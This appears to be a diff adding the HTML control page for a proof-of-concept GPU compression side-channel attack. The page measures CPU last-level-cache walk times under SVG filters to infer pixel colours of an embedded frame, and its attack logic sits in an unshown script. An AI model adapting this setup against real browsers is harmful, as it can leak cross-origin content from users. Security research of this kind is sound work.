@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="Content-Security-Policy" content="frame-src http://127.0.0.1:8000/ http://localhost:8000/ http://0.0.0.0:8000/">
+  <title>GPU Compression Side-Channel - LLC Walk Time (chrome-cache)</title>
+  <style>
+    html, body {
+      width: 100%;
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
+
+    #status {
+      color: red;
+      font-family: monospace;
+      font-size: 30px;
+      margin: 10px;
+    }
+
+    .white {
+      background: white;
+    }
+
+    .black {
+      background: black;
+    }
+
+    .timing1 {
+      filter: url(#filter1);
+    }
+
+    .timing2 {
+      filter: url(#filter2);
+    }
+
+    .svg-textarea {
+      width: 500px;
+      height: 200px;
+    }
+
+    .control-panel {
+      background: #f0f0f0;
+      padding: 15px;
+      margin: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+
+    .control-group {
+      margin: 10px 0;
+    }
+
+    label {
+      display: inline-block;
+      width: 200px;
+      font-weight: bold;
+    }
+
+    input[type="number"], input[type="text"] {
+      width: 100px;
+      padding: 3px;
+    }
+
+    button {
+      background: #4CAF50;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+      margin: 5px;
+    }
+
+    button:hover {
+      background: #45a049;
+    }
+
+    #info-panel {
+      background: #e8f4f8;
+      padding: 15px;
+      margin: 10px;
+      border-radius: 5px;
+      border: 1px solid #4CAF50;
+    }
+
+    .hidden {
+      visibility: hidden;
+    }
+  </style>
+  <script src="chrome.js"></script>
+</head>
+<body>
+  <h1 style="margin: 10px;">GPU Compression Side-Channel PoC - LLC Walk Time (Local Version)</h1>
+  
+  <div id="info-panel">
+    <strong>Platform:</strong> <span id="platform-info">Detecting...</span><br>
+    <strong>GPU:</strong> <span id="gpu-info">Detecting...</span><br>
+    <strong>Mode:</strong> Prime+Probe via CPU Last-Level Cache (LLC) walk time<br>
+    <strong>smallWarning: Note:</strong> This method only works with Intel/AMD iGPU (shared cache). Does NOT work with NVIDIA dGPU!
+  </div>
+
+  <div id="status">Ready!</div>
+
+  <div class="control-panel">
+    <h3>Configuration</h3>
+    
+    <div class="control-group">
+      <input type="checkbox" id="test-mode" name="test-mode" checked>
+      <label for="test-mode">Test mode (Only measure black/white LLC walk time difference)</label>
+    </div>
+
+    <div class="control-group">
+      <label>Time (ms):</label>
+      <input id="time" type="number" value="2000">
+      <small>How long to collect measurements</small>
+    </div>
+
+    <div class="control-group">
+      <label>Repetition:</label>
+      <input id="repetition" type="number" value="100">
+      <small>Number of black/white alternations</small>
+    </div>
+
+    <div class="control-group">
+      <label>Warmup time (s):</label>
+      <input id="warmup_time" type="number" value="10">
+      <small>Prime+Probe warmup</small>
+    </div>
+
+    <div class="control-group">
+      <label>Div Size:</label>
+      <input id="div_size" type="number" value="1000">
+      <small>Intermediate surface size (keep small for LLC)</small>
+    </div>
+
+    <div class="control-group">
+      <label>Layer:</label>
+      <input id="layer" type="number" value="10">
+      <small>SVG filter complexity</small>
+    </div>
+
+    <div class="control-group">
+      <label>Threshold Low:</label>
+      <input id="low" type="number" value="0.5">
+    </div>
+
+    <div class="control-group">
+      <label>Threshold High:</label>
+      <input id="high" type="number" value="0.8">
+    </div>
+
+    <div class="control-group">
+      <button id="runButton" onclick="reconstruct()">Run PoC</button>
+    </div>
+  </div>
+
+  <div class="control-panel">
+    <h3>Results</h3>
+    <div id="results">
+      <p>Click "Run PoC" to start testing.</p>
+      <p><strong>Black LLC Time:</strong> <span id="black-time">-</span> μs</p>
+      <p><strong>White LLC Time:</strong> <span id="white-time">-</span> μs</p>
+      <p><strong>Ratio:</strong> <span id="timing-ratio">-</span></p>
+    </div>
+  </div>
+
+  <div class="control-panel">
+    <h3>Filter Code (Generated)</h3>
+    <textarea id="filter-input" spellcheck="false" class="svg-textarea" readonly></textarea>
+  </div>
+
+  <!-- Without this rotateY trick, the GPU implementation would never attempt to fire -->
+  <div id="pixel" style="overflow:hidden;transform: rotateY(1deg);">
+    <iframe id="frame" style="width:1000px;height:1000px;" frameborder="0" scrolling="no"
+      src="pixel-embed-black.html"></iframe>
+  </div>
+
+  <svg height="0" id="input-filter1"></svg>
+  <svg height="0" id="input-filter2"></svg>
+</body>
+</html>
+
